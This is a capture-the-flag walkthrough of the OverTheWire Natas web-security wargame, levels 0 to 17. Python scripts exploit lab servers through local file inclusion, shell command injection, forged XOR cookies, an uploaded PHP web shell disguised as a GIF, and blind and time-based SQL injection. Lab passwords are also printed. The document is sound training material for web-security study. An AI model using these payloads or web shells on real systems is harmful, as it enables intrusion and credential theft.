Natas teaches the basics of server side web-security.

Each level of natas consists of its own website located at http://natasX.natas.labs.overthewire.org, where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.

Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.

Start here:

Username: natas0
Password: natas0
URL: http://natas0.natas.labs.overthewire.org

prerequisites

- Networking Basics
- Python with `requests` module
- PHP
- SQL
- Pearl

#### Why don't using Burp Suite

where Burp Suite is a set of tools used for penetration testing of web applications. but by scripting this in python helps us to solve this after long period back , without spending much time in burp suite , by just running this script

⚠️ **Disclaimer**: This solution was generated in May 2024. If you are accessing this information at a later date, please note that circumstances may have changed. Different levels of flags, variations in levels, and even new levels altogether might have been introduced. Please verify the most current and relevant information before making any decisions based on this content.

### Natas 0

Next Level Hash Password just stored in source file of natas0s

```py
import requests
import re

username = 'natas0'
password = 'natas0'

url = 'http://%s.natas.labs.overthewire.org'%username
response = requests.get(url,auth=(username,password))
content = response.text

flag = re.findall("<!--The password for natas1 is (.*) -->",content)[0]

print(flag)
```

---

### Natas 1

Again Same as Level 0

```py
import requests
import re

username = 'natas1'
password = 'g9D9cREhslqBKtcA2uocGHPfMZVzeFK6'

url = 'http://%s.natas.labs.overthewire.org'%username

response = requests.get(url,auth=(username,password))
content = response.text

flag = re.findall("<!--The password for natas2 is (.*) -->",content)[0]

print(flag)
```

---

### Natas 2

View the source file of natas2 using inspect tool , then there will be a `img` tag with path `~/files/pixel.png` , view the directory of `~/files/` there will a file called `users.txt` , refer those directory

```py
import requests
import re

username = 'natas2'
password = 'h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7'

url = 'http://%s.natas.labs.overthewire.org/files/users.txt'%username

response = requests.get(url,auth=(username,password))
content = response.text

flag = re.findall("natas3:(.*)",content)[0]
print(flag)
```

---

### Natas 3

There is no previous `img` file , so we refer `robots.txt` , [http://natas3.labs.overthewire.org/robots.txt](http://natas3.natas.labs.overthewire.org/robots.txt) which has

```
User-agent: *
Disallow: /s3cr3t/
```

Inside `~/s3cr3t/users.txt`

```py
import requests
import re

username = 'natas3'
password = 'G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q'
url = 'http://%s.natas.labs.overthewire.org/s3cr3t/users.txt'%username

response = requests.get(url,auth=(username,password))
content = response.text

flag = re.findall("natas4:(.*)",content)[0]
print(flag)
```

---

### Natas4

Content of **Natas 4**

Something new this time! This time when we visit the challenge page we get the following:

```
Access disallowed. You are visiting from "" while authorized users should come only from (http://natas5.natas.labs.overthewire.org/
```

So we are changing the headers username as natas5 using `headers` attribute in requests()

```py
import requests
import re

username = 'natas4'
password = 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm'

url = 'http://%s.natas.labs.overthewire.org'%username

response = requests.get(url, headers={'natas5': password}))
content = response.text
flag = re.findall("natas4:(.*)",content)[0]
print(flag)
```

---

### Natas 5

Content of natas5
Your not loggedin

```
HTTP/1.1 200 OK
Date: Thu, 27 Oct 2016 21:18:31 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.20
Set-Cookie: **loggedin=0**
Vary: Accept-Encoding
Content-Length: 855
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html
```

Default Get request has cookies which have 'loggedin' parameter = '0' so manipulate in cookies parameter

```py
import requests
import re

username = 'natas5'
password = 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'
url = 'http://%s.natas.labs.overthewire.org'%username
cookies = { 'loggedin' : '1'}
response = requests.get(url,auth=(username,password) , cookies=cookies)
content = response.text

flag = re.findall("The password for natas6 is (.*)</div>",content)[0]

print(flag)
```

---

### Natas 6

<img src="img/Pasted image 20240424120501.png" alt="Example Image" width="1080"/>

view the source of site [http://natas6.natas.labs.overthewire.org](http://natas6.natas.labs.overthewire.org) , there will be a `index-source.html` [http://natas6.natas.labs.overthewire.org/index-source.html](http://natas6.natas.labs.overthewire.org/index-source.html)

```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

`include "includes/secret.inc"` let check this path [http://natas6.natas.labs.overthewire.org/includes/secret.inc](http://natas6.natas.labs.overthewire.org/includes/secret.inc)

```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

The above code requesting post request with parameter `$secret` with value of `FOEIUWGHFEEUHOFUOIU` , so let add this to our code , if `$secret == $_POST` is True this will return next level password without censored

```py
import requests
import re

username = 'natas6'
password = 'fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR'

url = 'http://%s.natas.labs.overthewire.org/'%username

sessions = requests.Session()
response = requests.post(url, data={'secret' : 'FOEIUWGHFEEUHOFUOIU' , 'submit':'submit'} ,
 auth = (username,password))

content = response.text
flag = re.findall("The password for natas7 is (.*)",content)[0]
print(flag)

```

---

### Natas 7

<img src="img/Pasted image 20240424121634.png" alt="Example Image" width="1080"/>
The site has two other page called `Home` and `About` , let view source page using inspect tool ,

```html

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>

```

`<a>` tag for those page refers `index.php` , so we use local file inclusion technique [references](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
as we know password for next level is stored in path `/natas_webpass/` , we use `page` parameter and redirect from root using `../../../../natas_webpass/natas8` exactly URL look like this [http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8](http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8)

```py
import requests
import re

username = 'natas7'
password = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'
url = 'http://%s.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8'%username
response = requests.get(url,auth=(username,password) )
content = response.text
flag = re.findall("<br>\n(.*)\n\n<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->",content)[0]
print(flag)
```

---

### Natas 8

<img src="img/Pasted image 20240424123959.png" alt="Example Image" width="1080"/>
<br>
Again its looks similar to natas6 web page
it has one input and [view_source](http://natas8.natas.labs.overthewire.org/index-source.html)

```php
<?
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

`$encodedSecret = "3d3d516343746d4d6d6c315669563362";` we can post request using `secret` parameter , it should equal to `$encodedSecret` Variable above , after parsing it into `encodeSecret()` If we write alternate php script and retrieve original hash by reversing the algorithm

```php
<?
echo(base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362"))));
?>
```

This Script Print the original Hash `oubWYf2kBq` Hence we reversed algorithm of `encodeSecret`

```py
import requests
import re

username = 'natas8'
password = 'a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB'

url = 'http://%s.natas.labs.overthewire.org/'%username
sessions = requests.Session()
response = requests.post(url, data={'secret' : 'oubWYf2kBq' , 'submit':'submit'} , auth = (username,password))
content = response.text
flag = re.findall("The password for natas9 is (.*)",content)[0]
print(flag)
```

---

### Natas 9

This look like a if we type in input field , it will return similar words in that file

<img src="img/Pasted image 20240505093619.png" alt="Example Image" width="1080"/>

[view_source](http://natas9.natas.labs.overthewire.org/index-source.html)

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) 
{    
$key = $_REQUEST["needle"];
}

if($key != "") 
{    
passthru("grep -i $key dictionary.txt");
}
?>
```

As we seen source file , it using `$_REQUEST["needle"]` , we can send that key using post request with parameter as `needle` , again look at the php script , it passing that `key` into `passthru()` [link](https://www.php.net/manual/en/function.passthru.php) , its is php method used to Execute an external program and display raw output , using `grep` in server and getting words from `dictionary.txt` with `-i` case insensitive

we used to `cat /etc/natas/natas_webpass/natas10 #` but nothing got , so we used wild expression in the place of cat like `.*` which refers anything , `#` pound used to ignore remaining cmd , we successfully injected commands in php

```py
import requests
import re

username = 'natas9'
password = 'Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd'

url = 'http://%s.natas.labs.overthewire.org/'%username
url1 = 'http://%s.natas.labs.overthewire.org/index-source.html'%username

response = requests.Session()
response = response.post(url , data={"needle" : ".* /etc/natas_webpass/natas10 #" } , auth=(username,password))
content = response.text
flag = re.findall("/etc/natas_webpass/natas10:(.*)",content)[0]
print(flag)
```

---

### Natas 10

<img src="img/Pasted image 20240505100145.png" alt="Example Image" width="1080"/>

It look similar to previous level but this time it filters on certain characters

[view_source](http://natas10.natas.labs.overthewire.org/index-source.html)

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

it is same as previous levels , but this time they are filtering certain characters

```php
preg_match('/[;|&]/',$key)
```

`[ ; ] & |`
but in previous level we used `.* #` so we can use same script again this time because these characters not in `preg_match()`

```py
import requests
import re

username = 'natas10'
password = 'D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE'

url = 'http://%s.natas.labs.overthewire.org/'%username
url1 = 'http://%s.natas.labs.overthewire.org/index-source.html'%username

response = requests.Session()

response = response.post(url , data={"needle" : ".* /etc/natas_webpass/natas11 #"} , auth=(username,password))
content = response.text

flag = re.findall("/etc/natas_webpass/natas11:(.*)",content)[0]
print(flag)
```

---

### Natas 11

<img src="img/Pasted image 20240505100905.png" alt="Example Image" width="1080"/>

the cookies encrypted using XOR [ink](https://en.wikipedia.org/wiki/XOR_cipher) , and its has background-color input field
lets view source [view_source](http://natas11.natas.labs.overthewire.org/index-source.html)

```php
<?

$defaultdata = array("showpassword" => "no", "bgcolor" => "#ffffff");

function xor_encrypt($in)
{
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for ($i = 0; $i < strlen($text); $i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def)
{
    global $_COOKIE;
    $mydata = $def;
    if (array_key_exists("data", $_COOKIE)) {
        $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
        if (is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
            if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
                $mydata['showpassword'] = $tempdata['showpassword'];
                $mydata['bgcolor'] = $tempdata['bgcolor'];
            }
        }
    }
    return $mydata;
}

function saveData($d)
{
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if (array_key_exists("bgcolor", $_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);

?>

<h1>natas11</h1>
<div id="content">
    <body style="background: <?= $data['bgcolor'] ?>;">
        Cookies are protected with XOR encryption<br/><br/>

        <?php if ($data["showpassword"] == "yes") {
            print "The password for natas12 is <censored><br>";
        } ?>
    </body>
</div>

```

Last portion has this content

```php
<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/><?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}?><form>
Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
<input type=submit value="Set color">
</form><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

now we know that if `$data["showpassword"] == "yes"` will return next password

```php
$defaultdata = array("showpassword" => "no", "bgcolor" => "#ffffff");

function xor_encrypt($in)
{
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for ($i = 0; $i < strlen($text); $i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def)
{
    global $_COOKIE;
    $mydata = $def;
    if (array_key_exists("data", $_COOKIE)) {
        $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
        if (is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
            if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
                $mydata['showpassword'] = $tempdata['showpassword'];
                $mydata['bgcolor'] = $tempdata['bgcolor'];
            }
        }
    }
    return $mydata;
}

function saveData($d)
{
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if (array_key_exists("bgcolor", $_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);

?>
```

where `array("showpassword" => "no", "bgcolor" => "#ffffff");` loaded into `loadData()`
and `xor_encrypt(base64_decode($_COOKIE["data"])` , cookies converted into json data as`$tempdata` and assign to `$mydata`

```php
if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
                $mydata['showpassword'] = $tempdata['showpassword'];
                $mydata['bgcolor'] = $tempdata['bgcolor'];
            }
```

we don't the key to encrypt in XOR ,

```py
import requests
import urllib.parse as urllib

username = 'natas11'
password = '1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg'

url = 'http://%s.natas.labs.overthewire.org/'%username
session = requests.Session()
response = session.get(url,auth=(username,password))
print(urllib.unquote(session.cookies['data']))
```

```
MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D
```

`urllib.parse.unquote()` used to decode URL encoding

```
MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=
```

We understand the what is happening and we want key

```
In XOR Encryption

org_data = $defaultdata=array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

^ = xor operator

org_data ^ Key -> above_cookies
org_data ^ above_cookies -> key

// A ^ B = C
// A ^ C = B

then we know key we have to change org_data into spoofdata
$defaultdata=array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

spoofdata
$defaultdata=array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
                                     ^^^

and then encrypted using xor_encrypt(spoofdata ,key) -> NEW COOKIES
```

by writing a php script to back track this process and we utilized those `xor_encrypt()` from source file

```php
<?php
$defaultdata=array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

    function xor_encrypt($in , $key) {

        $text = $in;
        $outText = '';

        // Iterate through each character
        for($i=0;$i<strlen($text);$i++)
        {
            $outText .=$text[$i] ^ $key[$i % strlen($key)];
        }
        return $outText;
    }

    $cookie = "MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=";
    $cipher_text = base64_decode($cookie);
    $org_data =  json_encode($defaultdata);

   echo(xor_encrypt($org_data,$cipher_text));

   $spoof_data = json_encode(array("showpassword" => "yes" , "bgcolor" => "#ffffff"));
   $key = "KNHL";

   $new_cookie = xor_encrypt($spoof_data, $key);
   echo("\n");
   echo(base64_encode($new_cookie));

// $cipher_text ^ $key = $cookies
// $cipher_text ^ $cookies = $key
// $spoof_data ^ $key = $new_cookies

?>
```

we have to change cookies into `$newcookies` , we got from above script

```py
import requests
import re
import urllib.parse as urllib

username = 'natas11'
password = '1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg'

url = 'http://%s.natas.labs.overthewire.org/'%username
url1 = 'http://%s.natas.labs.overthewire.org/index-source.html'%username

session = requests.Session()

cookies = {"data" : "MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz"}

response = session.get(url,auth=(username,password) ,cookies=cookies)

content = response.text
flag = re.findall("The password for natas12 is (.*)<br>",content)[0]
print(flag)
```

---

### Natas 12

<img src="img/Pasted image 20240505120939.png" alt="Example Image" width="1080"/>

it looks like , we can upload any jpeg image with size limit of max 1000 kb , it stores the img with random name

<img src="img/Pasted image 20240505122002.png" alt="Example Image" width="1080"/>

[view-source](http://natas12.natas.labs.overthewire.org/index-source.html)

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters) - 1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
        $path = $dir . "/" . genRandomString() . "." . $ext;
    } while (file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if (array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    if (filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else {
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
    ?>

    <form enctype="multipart/form-data" action="index.php" method="POST">
        <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
        <input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
        Choose a JPEG to upload (max 1KB):<br/>
        <input name="uploadedfile" type="file" /><br />
        <input type="submit" value="Upload File" />
    </form>

    <?php
}
?>

```

we make a php script and save as `pwd_script.php` , store in current root directory

```php
<?php system( $_GET['pwd'].' 2>&1'); ?>
```

Uploading a file that executes some kind of command (preferably in an interactive way) is called a web shell . This is a one-liner web shell that:

- Gets the `pwd` parameter from a GET request
- Executes this value
- Redirects `stderr` (standard error) output to `stdout` (standard out) so we can see any error messages

From source we know that , `filename` and `MAX_FILE_SIZE` should match in post request , to upload file in requests module , we can use `files` parameter in `requests.post()`

and as we we know the file has been stored with random_name

```php
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters) - 1)];
    }

    return $string;
}
```

we get those by regex in python and again we can web_shell using `pwd` parameter to `cat /etc/natas_webpass/natas13`
some like this `upload/???????.php?pwd=whoami`

```py
import requests
import re

username = 'natas12'
password = 'YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG'

url = 'http://%s.natas.labs.overthewire.org/'%username
session = requests.Session()
response = session.post(url , files={"uploadedfile" : open('pwd_script.php','rb') } , data = {"filename" : "pwd_script.php" , "MAX_FILE_SIZE" : "1000"}, auth=(username,password))

rand_name = re.findall('"upload/(.*).php"',response.text)[0] #addtw10c.php
response = session.get(url + 'upload/'+rand_name+'.php?pwd=cat /etc/natas_webpass/natas13' , auth =(username,password))

content = response.text
print(content)

```

---

### Natas 13

<img src="img/Pasted image 20240505134633.png" alt="Example Image" width="1080"/>

its look same as previous level except , for security reasons , they accept only image files
i tried to upload previous `pwd_script.php` , i can't able to upload

let see [view-source](http://natas13.natas.labs.overthewire.org/index-source.html)

```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
```

Its same as previous but this time they are check `exif_data()` of file that means meta data whether the given file is image
Let same `pwd_script.php`

```php
GIF89a
<?php system( $_GET['pwd'].' 2>&1'); ?>
```

`GIF89a` refers this file as image

again same script from previous levels and explanation in previous level refers above natas12

```py

import requests
import re

username = 'natas13'
password = 'lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9'

url = 'http://%s.natas.labs.overthewire.org/'%username

session = requests.Session()
response = session.post(url , files={"uploadedfile" : open('pwd_script.php','rb') } , data = {"filename" : "pwd_script.php" , "MAX_FILE_SIZE" : "1000"}, auth=(username,password))
rand_name = re.findall('"upload/(.*).php"',response.text)[0] # upload/3buos7gfom.php
response = session.get(url + 'upload/'+rand_name+'.php?pwd=cat /etc/natas_webpass/natas14' , auth =(username,password))
content = response.text
print(content)
```

---

### Natas 14

<img src="img/Pasted image 20240505135554.png" alt="Example Image" width="1080"/>

There is login page with username and password field as input

Let see source file [view-source](http://natas14.natas.labs.overthewire.org/index-source.html)

```php
<?php
if (array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $username = $_REQUEST["username"];
    $password = $_REQUEST["password"];

    $query = "SELECT * FROM users WHERE username=\"$username\" AND password=\"$password\"";
    if (array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $result = mysqli_query($link, $query);
    if (mysqli_num_rows($result) > 0) {
        echo "Successful login! The password for natas15 is <censored><br>";
    } else {
        echo "Access denied!<br>";
    }

    mysqli_close($link);
} else {
    ?>
    <!-- HTML Form for username and password input -->
    <form method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="submit" value="Login">
    </form>
    <?php
}
?>

```

Its looks like they are using SQL database and username & password are concatenate into `$query` variable , that variable executing in `mysqli_query($link, $query)` then let use SQL injection

```php
 $query = "SELECT * FROM users WHERE username=\"$username\" AND password=\"$password\"";
```

They are using `"` to enclose the string let terminate that with another `"` in username field and then inject SQL like `or true`

```
natas 15 " OR 1=1 #
```

`#` or `--` used to comment remaining keywords , this will like this return record where username = "natas15" OR 1=1 #

```py
import requests
import re

username = 'natas14'
password = 'qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP'

url = 'http://%s.natas.labs.overthewire.org/'%username

session = requests.Session()
response = session.post(url , data = { "username" : 'natas15 " OR 1=1 #' , "password" : "" } , auth=(username,password))
content = response.text
flag = re.findall("The password for natas15 is (.*)<br>",content)[0]
print(flag)
```

---

### Natas 15

<img src="img/Pasted image 20240505151416.png" alt="Example Image" width="1080"/>
<br>
its looks like a username field , so i tired natas16

<br>
<img src="img/Pasted image 20240505151510.png" alt="Example Image" width="1080"/>

we got this user exists.

Let see the source file [view-source](http://natas15.natas.labs.overthewire.org/index-source.html) and we got schema of DB

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>

```

we can use same SQL injection from previous level , but this time password field not , there and its return give actual password , it just say whether the username exist in the database we can use `LIKE %%` to check partial password something like this , where AND Boolean used to true if both natas16 and password LIKE "a%" , instead `a` we check every characters (letters + digits) and brute force password , `BINARY` used why because SQL case insensitive , binary unique for both uppercase and lowercase characters , This called as **BOOLEAN BASED - BLIND SQL INJECTION**

```
natas16 AND password BINARY LIKE "a%" #
```

Let focus on brute force and if we get response `user exits` then , its a correct character append to `seen_password` List till got the full password

```py
seen_password = list()

while (len(seen_password) < 32):
	for ch in characters:
		print("Trying char with passwd", "".join(seen_password) + ch )
		response = session.post( url , data = { "username" : 'natas16" AND BINARY password LIKE "' + "".join(seen_password) + ch +'%" # ' } , auth=(username,password))
		content = response.text
		if ('user exists' in content):
			seen_password.append(ch)
```

```
a..z + A..Z + 0..9

these characters brute forcing the if we got user exist , then append to seen_passoword till length of password is 32 , as we know from previous levels flag lengh is 32
```

Let write full python script

```py
import requests
import os ,sys
from string import *

# This used to clear terminal after we checked char
cmd = ""
os_name = sys.platform
if os_name == 'win32':
	cmd = "cls"
elif os_name == 'linux' or os_name == 'darwin':
	cmd =  "clear"

characters = ascii_lowercase + ascii_uppercase + digits
username = "natas15"
password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"

url = "http://%s.natas.labs.overthewire.org"%username

session = requests.Session()
seen_password = list()

while (len(seen_password) < 32):
	for ch in characters:
		print("Trying char with passwd", "".join(seen_password) + ch )
		response = session.post( url , data = { "username" : 'natas16" AND BINARY password LIKE "' + "".join(seen_password) + ch +'%" # ' } , auth=(username,password))
		content = response.text
		if ('user exists' in content):
			seen_password.append(ch)


flag = "".join(seen_password)
print("[+] Gotcha ",flag)
```

---

### Natas 16

<img src="img/Pasted image 20240505165240.png" alt="Example Image" width="1080"/>

its look like natas10 and let see source file [view-source](http://natas16.natas.labs.overthewire.org/index-source.html)

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

<img src="img/Pasted image 20240505165913.png" alt="Example Image" width="1080"/>

use caret `^` display the every word form `dictionary.txt` and find unique word like `anythings , anaesthetics`

we can shell cmds in through php passthru() , first we will give unique word from dictionary with that including `$(grep ^WILDCARD /etc/natas_webpass/natas17)` which looks like this

```
anaesthetics$(grep ^WILDCARD /etc/natas_webpass/natas17)
```

into needle parameter and caret (^) indicates the beginning of the line. So the command `$ grep ^b list` finds any line in the file list starting with "b."

if we got the correct character then we append that character into seen_password list
how we determine whether trying character is correct or not , simply by check if guessing character is correct , it won't return anything in `<pre></pre>` tag , if `flag == []` then we append that character with seen password , if not it will return that unique word `anaesthetics` This called as Blind Grep & RCE

```py
session = requests.Session()
seen_password = list()
while (len(seen_password) < 32):

	for ch in characters:
		print("Trying char : ", "".join(seen_password) + ch)
		response = session.post(url , data={ "needle" : "anaesthetics$(grep ^" + "".join(seen_password) + ch + " /etc/natas_webpass/natas17)" } , auth=(username,pasword))
		content = response.text
		flag = re.findall("<pre>\n(.*)\n</pre>" , content)
		if flag == []:
			seen_password.append(ch)
```

Let write the full python script

```py
import requests
import re
import os ,sys
from string import *


cmd = ""
os_name = sys.platform
if os_name == 'win32':
	cmd = "cls"
elif os_name == 'linux' or os_name == 'darwin':
	cmd =  "clear"

characters = ascii_lowercase + ascii_uppercase + digits
username = "natas16"
pasword = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
url = "http://%s.natas.labs.overthewire.org"%username

# anaesthetics grep ^* /etc/natas_webpass/natas17
session = requests.Session()
seen_password = list()

while (len(seen_password) < 32):

	for ch in characters:
		print("Trying char : ", "".join(seen_password) + ch)
		response = session.post(url , data={ "needle" : "anaesthetics$(grep ^" + "".join(seen_password) + ch + " /etc/natas_webpass/natas17)" } , auth=(username,pasword))
		content = response.text
		flag = re.findall("<pre>\n(.*)\n</pre>" , content)
		if flag == []:
			seen_password.append(ch)
		os.system(cmd)

flag = "".join(seen_password)
print("[+] Gotcha ",flag)
```

---

### Natas 17

<img src="img/Pasted image 20240505172037.png" alt="Example Image" width="1080"/>
<br>

[View-Source](http://natas17.natas.labs.overthewire.org/index-source.html) and we know database schema

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if (array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * FROM users WHERE username=\"" . $_REQUEST["username"] . "\"";
    if (array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if ($res) {
        if (mysqli_num_rows($res) > 0) {
            //echo "This user exists.<br>";
        } else {
            //echo "This user doesn't exist.<br>";
        }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<!-- HTML Form for checking user existence -->
<form action="index.php" method="POST">
    Username: <input name="username"><br>
    <input type="submit" value="Check existence" />
</form>

<?php
}
?>

```

It Almost similar to natas15 but except we cannot able to brute forcing this valid character in password , because those are commented with `//`

Let try timing based - SQL Injection using `SLEEP(1)` , using this we can able to determine whether by time

```SQL
natas18" AND password LIKE BINARY "' + "".join(seen_password) + ch +'%" AND SLEEP(1) #
```

as we know `username && passw???d && sleep(1)` if 2nd argument is true , response will delay for 1 second by `SLEEP(1)`

```py
from time import *
start_time = time()
responese -> post sql injection
end_time = time()

diff = end_time - start_time
as we know if brute forcing char is starting char of flag ,
